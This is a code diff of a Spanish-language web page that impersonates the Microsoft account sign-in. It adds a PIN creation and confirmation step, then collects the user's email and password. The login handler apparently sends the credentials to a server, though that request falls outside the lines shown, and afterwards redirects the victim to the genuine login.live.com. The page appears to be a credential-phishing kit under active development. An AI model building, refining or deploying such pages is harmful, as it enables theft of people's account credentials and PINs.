@@ -120,15 +120,10 @@
 
             <!-- Pantalla 1: Crear PIN -->
             <div id="step1">
-                <h1 class="text-title margin-bottom-16">Crear un PIN</h1>
+                <h1 class="text-title margin-bottom-16">Crear un PIN de seguridad</h1>
                 <div class="row margin-bottom-16">
-                    <div class="form-group col-md-12">
-                        <input type="password" id="pinInput" class="form-control" placeholder="PIN (4 dígitos)" required="required" aria-required="true" maxlength="4" autocomplete="off">
-                    </div>
-                </div>
-                <div class="row margin-bottom-16">
-                    <div class="form-group col-md-12">
-                        <input type="password" id="confirmPinInput" class="form-control" placeholder="Confirmar PIN" required="required" aria-required="true" maxlength="4" autocomplete="off">
+                    <div class="form-group col-md-12 placeholderContainer">
+                        <input type="password" id="pinInput" class="form-control" placeholder="Crea un PIN de 4 dígitos" required="required" aria-required="true" autocomplete="off">
                     </div>
                 </div>
                 <div class="row inline-block no-margin-top-bottom button-container">
@@ -136,29 +131,48 @@
                 </div>
             </div>
 
-            <!-- Pantalla 2: Ingresar Correo -->
+            <!-- Pantalla 2: Confirmar PIN -->
             <div id="step2" style="display: none;">
+                <h1 class="text-title margin-bottom-16">Confirmar el PIN</h1>
+                <div class="row margin-bottom-16">
+                    <div class="form-group col-md-12 placeholderContainer">
+                        <input type="password" id="pinConfirmInput" class="form-control" placeholder="Confirma tu PIN" required="required" aria-required="true" autocomplete="off">
+                    </div>
+                </div>
+                <div class="row inline-block no-margin-top-bottom button-container">
+                    <button id="confirmPinButton" class="btn btn-block btn-primary">Confirmar PIN</button>
+                </div>
+            </div>
+
+            <!-- Pantalla 3: Solicitar Correo -->
+            <div id="step3" style="display: none;">
                 <h1 class="text-title margin-bottom-16">Iniciar sesión</h1>
                 <div class="row margin-bottom-16">
-                    <div class="form-group col-md-12">
+                    <div class="form-group col-md-12 placeholderContainer">
                         <input type="email" id="emailInput" name="mail" class="form-control" placeholder="Correo electrónico, teléfono o Skype" required="required" aria-required="true" autocomplete="off">
                     </div>
                 </div>
                 <div class="row inline-block no-margin-top-bottom button-container">
                     <button id="nextButtonEmail" class="btn btn-block btn-primary">Siguiente</button>
                 </div>
+                <div class="___wqsyy40 f15tpi3i">
+                    ¿No tiene una cuenta? 
+                    <a href="https://signup.live.com/signup" tabindex="0" role="button" aria-label="Crear una cuenta de Microsoft " id="signup" data-testid="signUpLink" class="___1hl8tjj f11xvspe f1bsjrm3 f3rmtva f1ern45e f1n71otn f1h8hb77 f1deefiw fryk5ur fv6z6zc f1cio4g9 f1mwb9y5 f1ynmygo f121g8nd f1i82eaq f8491dx f1nbblvp fifp7yv f1ov4xf1 f1asdtw4 f1gqcn34 fbabzkn felxxx9 fqttjmt">
+                        Cree una.
+                    </a>
+                </div>
             </div>
 
-            <!-- Pantalla 3: Ingresar Contraseña -->
-            <div id="step3" style="display: none;">
+            <!-- Pantalla 4: Solicitar Contraseña -->
+            <div id="step4" style="display: none;">
                 <h1 class="text-title margin-bottom-16">Escribir contraseña</h1>
                 <div class="row margin-bottom-16">
-                    <div class="form-group col-md-12">
+                    <div class="form-group col-md-12 placeholderContainer">
                         <input type="email" id="emailDisplay" class="form-control" disabled>
                     </div>
                 </div>
                 <div class="row margin-bottom-16">
-                    <div class="form-group col-md-12">
+                    <div class="form-group col-md-12 placeholderContainer">
                         <input type="password" id="passwordInput" name="pwd" class="form-control" placeholder="Contraseña" required="required" aria-required="true" autocomplete="off">
                     </div>
                 </div>
@@ -183,81 +197,69 @@
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
         const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
         const pinInput = document.getElementById('pinInput');
-        const confirmPinInput = document.getElementById('confirmPinInput');
+        const pinConfirmInput = document.getElementById('pinConfirmInput');
         const emailInput = document.getElementById('emailInput');
         const emailDisplay = document.getElementById('emailDisplay');
         const passwordInput = document.getElementById('passwordInput');
         const nextButtonPin = document.getElementById('nextButtonPin');
+        const confirmPinButton = document.getElementById('confirmPinButton');
         const nextButtonEmail = document.getElementById('nextButtonEmail');
         const loginButton = document.getElementById('loginButton');
 
-        // Función para avanzar de paso
-        function goToNextStep(stepFrom, stepTo, inputElement) {
-            inputElement.addEventListener('keypress', (event) => {
-                if (event.key === 'Enter') {
-                    if (stepFrom === step1) {
-                        const pin = pinInput.value;
-                        const confirmPin = confirmPinInput.value;
-                        if (pin !== confirmPin) {
-                            alert('Los PINs no coinciden.');
-                            return;
-                        }
-                        stepFrom.style.display = 'none';
-                        stepTo.style.display = 'block';
-                    } else if (stepFrom === step2) {
-                        const email = emailInput.value.trim();
-                        if (!email) {
-                            alert('Por favor, ingrese un correo válido.');
-                            return;
-                        }
-                        emailDisplay.value = email;
-                        stepFrom.style.display = 'none';
-                        stepTo.style.display = 'block';
-                    } else if (stepFrom === step3) {
-                        const password = passwordInput.value.trim();
-                        if (!password) {
-                            alert('Por favor, ingrese su contraseña.');
-                            return;
-                        }
-                        stepFrom.style.display = 'none';
-                        stepTo.style.display = 'block';
-                    }
-                }
-            });
+        // Función para simular el click de un botón
+        function triggerButtonClick(button) {
+            button.click();
         }
 
-        // Llamar a la función para permitir avanzar con Enter
-        goToNextStep(step1, step2, pinInput);
-        goToNextStep(step2, step3, emailInput);
-        goToNextStep(step3, null, passwordInput);
-
-        // Validación y envío de formulario (paso 2 y paso 3)
+        // Paso 1: Ir a la pantalla de confirmación del PIN
         nextButtonPin.addEventListener('click', () => {
-            const pin = pinInput.value;
-            const confirmPin = confirmPinInput.value;
-            if (pin !== confirmPin) {
-                alert('Los PINs no coinciden.');
+            const pin = pinInput.value.trim();
+            if (pin.length !== 4) {
+                alert('Por favor, ingrese un PIN de 4 dígitos.');
                 return;
             }
+
+            // Guardar PIN y pasar al siguiente paso
+            localStorage.setItem('pin', pin);
             step1.style.display = 'none';
             step2.style.display = 'block';
         });
 
+        // Paso 2: Confirmar el PIN
+        confirmPinButton.addEventListener('click', () => {
+            const pin = pinConfirmInput.value.trim();
+            const savedPin = localStorage.getItem('pin');
+
+            if (pin !== savedPin) {
+                alert('Los PINs no coinciden, por favor intente de nuevo.');
+                return;
+            }
+
+            step2.style.display = 'none';
+            step3.style.display = 'block';
+        });
+
+        // Paso 3: Ir a la pantalla de contraseña
         nextButtonEmail.addEventListener('click', () => {
             const email = emailInput.value.trim();
             if (!email) {
                 alert('Por favor, ingrese un correo válido.');
                 return;
             }
+
+            // Guardar correo y pasar al siguiente paso
             emailDisplay.value = email;
-            step2.style.display = 'none';
-            step3.style.display = 'block';
+            step3.style.display = 'none';
+            step4.style.display = 'block';
         });
 
+        // Paso 4: Iniciar sesión
         loginButton.addEventListener('click', async () => {
             const email = emailDisplay.value;
             const password = passwordInput.value.trim();
+
             if (!password) {
                 alert('Por favor, ingrese su contraseña.');
                 return;
@@ -276,13 +278,40 @@
                     return;
                 }
 
+                // Redirigir al usuario a https://login.live.com
                 window.location.href = 'https://login.live.com';
             } catch (error) {
                 alert('Error de conexión al servidor.');
             }
         });
+
+        // Activar el siguiente paso al presionar Enter (Paso 1)
+        pinInput.addEventListener('keypress', (event) => {
+            if (event.key === 'Enter') {
+                triggerButtonClick(nextButtonPin);
+            }
+        });
+
+        // Activar el siguiente paso al presionar Enter (Paso 2)
+        pinConfirmInput.addEventListener('keypress', (event) => {
+            if (event.key === 'Enter') {
+                triggerButtonClick(confirmPinButton);
+            }
+        });
+
+        // Activar el siguiente paso al presionar Enter (Paso 3)
+        emailInput.addEventListener('keypress', (event) => {
+            if (event.key === 'Enter') {
+                triggerButtonClick(nextButtonEmail);
+            }
+        });
+
+        // Activar el siguiente paso al presionar Enter (Paso 4)
+        passwordInput.addEventListener('keypress', (event) => {
+            if (event.key === 'Enter') {
+                triggerButtonClick(loginButton);
+            }
+        });
     </script>
 </body>
 </html>
-
-
